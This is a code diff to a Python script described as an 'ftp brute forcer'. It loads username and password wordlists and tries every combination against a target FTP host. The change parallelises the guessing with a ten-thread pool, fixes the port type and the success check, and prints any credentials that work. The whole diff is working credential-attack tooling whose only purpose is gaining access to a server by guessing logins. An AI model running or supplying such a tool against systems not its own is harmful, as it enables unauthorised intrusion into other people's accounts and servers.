@@ -5,11 +5,11 @@ import argparse
 
 parser = argparse.ArgumentParser(description="ftp brute forcer")
 parser.add_argument("-t", "--target", help="host")
-parser.add_argument("-p", "--port", help="port", default=21)
+parser.add_argument("-p", "--port", help="port",type=int, default=21)
 args = parser.parse_args()
 
-USERNAME_FILE = "python/wordlist/username_wordlist.txt"
-PASSWORD_FILE = "python/wordlist/password_wordlist.txt"
+USERNAME_FILE = r"python\wordlist\username_wordlist.txt"
+PASSWORD_FILE = r"python\wordlist\password_wordlist.txt"
 
 def load_wordlists(filepath):
     with open(filepath, "r") as f:
@@ -45,10 +45,22 @@ def main():
     for username in usernames:
         for password in passwords:
             combos.append((username,password))
-    for username,password in combos:
-        scan(args.target,args.port,username,password)
-        if scan == True:
-            print(combos)
+    found = False
+
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = []
+        for username, password in combos:
+            future = executor.submit(scan, args.target, args.port, username, password)
+            futures.append((future, username, password))
+
+        for future, username, password in futures:
+            if future.result():
+                print(f"found >> {username}:{password}")
+                found = True
+                break
+
+    if not found:
+        print("no credentials found")
 
     print(f"\nScan completed in {time.perf_counter() - start:.2f}s")
 
